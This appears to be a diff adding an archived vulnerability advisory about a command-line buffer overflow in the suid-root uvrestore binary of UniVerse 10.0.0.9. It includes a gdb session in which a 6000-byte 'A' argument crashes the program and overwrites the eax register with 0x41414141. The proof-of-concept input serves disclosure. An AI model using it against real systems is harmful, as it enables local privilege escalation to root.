@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/8206/info
+
+It has been reported that the uvrestore binary does not perform bounds checking when parsing command-line arguments. Because this binary is installed with suid root privileges by default, local attackers my be able to exploit this vulnerability to elevate privileges.
+
+While this vulnerability was reported in UniVerse version 10.0.0.9, previous versions are likely vulnerable as well.
+
+(gdb) r `perl -e 'print "A" x 6000'` 
+Starting program: uvrestore `perl -e 'print "A" x 6000'`
+Program received signal SIGSEGV, Segmentation fault.
+0x0805e81a in basename ()
+(gdb) bt
+#0 0x0805e81a in basename ()
+#1 0x080619b3 in basename ()
+#2 0x42015574 in libc_start_main () from /lib/tls/libc.so.6
+(gdb) i r
+eax 0x41414141 1094795585
